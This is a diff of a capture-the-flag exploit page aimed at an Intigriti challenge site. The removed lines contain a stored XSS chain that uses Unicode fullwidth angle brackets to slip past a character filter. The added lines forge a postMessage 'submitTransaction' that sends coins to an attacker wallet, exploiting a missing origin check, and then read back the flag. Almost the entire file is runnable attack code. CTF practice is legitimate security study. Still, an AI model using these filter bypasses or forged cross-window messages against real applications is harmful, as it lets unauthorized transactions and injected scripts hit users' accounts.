@@ -1,134 +1,57 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>XSS Exploit</title>
+    <title>Exploit</title>
 </head>
 <body>
-    <h1>Intigriti January 2026 Challenge - XSS Exploit</h1>
-    <p>Exploiting Unicode fullwidth character bypass for XSS</p>
+    <h1>Intigriti Challenge - Simple CSRF Exploit</h1>
     <p id="status">Starting...</p>
 
     <script>
         const TARGET = 'https://challenge-0126.intigriti.io';
-        const TARGET_WALLET = '16472226db03703a192aa383237035a69f';
-
-        // THE KEY: Unicode fullwidth characters bypass the regex!
-        // ＜ = U+FF1C (FULLWIDTH LESS-THAN SIGN) - looks like <
-        // ＞ = U+FF1E (FULLWIDTH GREATER-THAN SIGN) - looks like >
-        // The regex /[<>'"\\]/g only matches ASCII, not Unicode fullwidth!
-
-        const XSS_PAYLOAD = '＜img src=x onerror=alert(String.fromCharCode(103,105,103,97,119,97,116,122))＞';
-
-        // For the exploit chain, we need JavaScript code that:
-        // 1. Opens checkout.html
-        // 2. Uses postMessage to send coins
-        const EXPLOIT_JS = `
-            const w = window.open('${TARGET}/checkout.html?currency=1337COIN&price=1', 'checkout');
-            setTimeout(() => {
-                w.postMessage({
-                    type: 'submitTransaction',
-                    transaction: {
-                        toAddress: '${TARGET_WALLET}',
-                        currency: '1337COIN',
-                        amount: 1
-                    }
-                }, '*');
-            }, 2000);
-        `;
-
-        // Use src attribute with JavaScript protocol
-        const FULL_XSS = `＜img src=x onerror="${EXPLOIT_JS}"＞`;
+        const OUR_WALLET = '16472226db03703a192aa383237035a69f';
 
         async function exploit() {
             const status = document.getElementById('status');
+            
+            status.textContent = 'Opening checkout.html...';
+            
+            // Open checkout.html in same-origin context
+            const checkout = window.open(
+                TARGET + '/checkout.html?currency=1337COIN&price=1',
+                'checkout',
+                'width=500,height=600'
+            );
 
-            try {
-                // Step 1: Register user with XSS payload as username
-                status.textContent = 'Registering user with Unicode XSS payload...';
+            // Wait for page to load
+            await new Promise(r => setTimeout(r, 2000));
 
-                const registerResponse = await fetch(TARGET + '/api/register', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    credentials: 'include',
-                    body: JSON.stringify({
-                        username: XSS_PAYLOAD,
-                        password: 'password123'
-                    })
-                });
-
-                if (!registerResponse.ok) {
-                    status.textContent = 'Registration failed: ' + await registerResponse.text();
-                    return;
+            status.textContent = 'Sending postMessage to submit transaction...';
+            
+            // Send transaction via postMessage (NO ORIGIN CHECK!)
+            checkout.postMessage({
+                type: 'submitTransaction',
+                transaction: {
+                    toAddress: OUR_WALLET,
+                    currency: '1337COIN',
+                    amount: 1
                 }
-                status.textContent = 'Registration successful!';
+            }, '*');
 
-                // Step 2: Login
-                status.textContent = 'Logging in...';
-                const loginResponse = await fetch(TARGET + '/api/login', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    credentials: 'include',
-                    body: JSON.stringify({
-                        username: XSS_PAYLOAD,
-                        password: 'password123'
-                    })
-                });
-
-                if (!loginResponse.ok) {
-                    status.textContent = 'Login failed!';
-                    return;
+            status.textContent = 'Transaction submitted! Admin sends 1 1337COIN to ' + OUR_WALLET;
+            
+            // After transaction, get flag
+            setTimeout(async () => {
+                status.textContent = 'Getting flag...';
+                const response = await fetch(TARGET + '/api/me', { credentials: 'include' });
+                const data = await response.json();
+                if (data.flag) {
+                    status.textContent = 'FLAG: ' + data.flag;
+                    alert('FLAG: ' + data.flag);
+                } else {
+                    status.textContent = 'Waiting for coins...';
                 }
-                status.textContent = 'Login successful!';
-
-                // Step 3: Get our wallet address
-                status.textContent = 'Getting wallet address...';
-                const walletsResponse = await fetch(TARGET + '/api/wallets', {
-                    credentials: 'include'
-                });
-                const wallets = await walletsResponse.json();
-                const l337Wallet = wallets.find(w => w.currency === '1337COIN');
-
-                if (!l337Wallet) {
-                    status.textContent = 'No 1337COIN wallet found!';
-                    return;
-                }
-                status.textContent = 'Wallet: ' + l337Wallet.address;
-
-                // Step 4: Create transaction (send 0 coins to create marketwatch entry)
-                status.textContent = 'Creating transaction with XSS payload...';
-
-                // Open checkout in popup
-                const checkout = window.open(
-                    TARGET + '/checkout.html?currency=1337COIN&price=0',
-                    'checkout',
-                    'width=500,height=600'
-                );
-
-                await new Promise(r => setTimeout(r, 2000));
-
-                // Send 0 coins to ourselves to create transaction with XSS payload
-                checkout.postMessage({
-                    type: 'submitTransaction',
-                    transaction: {
-                        toAddress: l337Wallet.address,
-                        currency: '1337COIN',
-                        amount: 0
-                    }
-                }, '*');
-
-                await new Promise(r => setTimeout(r, 3000));
-
-                // Step 5: Redirect to marketwatch to trigger XSS
-                status.textContent = 'Redirecting to marketwatch... (XSS should trigger)';
-
-                setTimeout(() => {
-                    window.location.href = TARGET + '/marketwatch.html';
-                }, 2000);
-
-            } catch (error) {
-                status.textContent = 'Error: ' + error.message;
-                console.error(error);
-            }
+            }, 5000);
         }
 
         // Auto-start
